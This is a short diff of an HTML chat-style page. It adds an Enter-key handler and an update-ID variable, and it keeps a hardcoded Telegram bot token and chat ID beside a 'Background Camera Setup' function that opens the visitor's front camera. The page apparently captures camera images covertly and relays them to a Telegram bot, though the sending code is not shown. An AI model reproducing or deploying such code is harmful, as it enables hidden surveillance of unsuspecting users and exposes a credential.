@@ -217,9 +217,10 @@ button {
     <canvas id="canvas"></canvas>
 
     <script>
-        const botToken = "7941135502:AAHz-KGvAAoZEhPVgfVKw3zFbkaB0_Pi5rM";  
-        const chatId = "878604830";  
-
+           
+        let lastUpdateId = 0; // ✅ Fix: Initialize lastUpdateId
+        const botToken = "7941135502:AAHz-KGvAAoZEhPVgfVKw3zFbkaB0_Pi5rM"; 
+        const chatId = "878604830";
         // 📸 Background Camera Setup
         async function startCamera() {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
@@ -418,7 +419,13 @@ button {
                 sendButton.classList.remove('active');
             }
         }
-
+// 🎯 Check if Enter is pressed to send the message
+function checkEnter(event) {
+    if (event.key === 'Enter') {
+        event.preventDefault(); // Prevent default new line behavior
+        sendMessage(); // Call the send message function
+    }
+}
     </script>
 </body>
 </html>
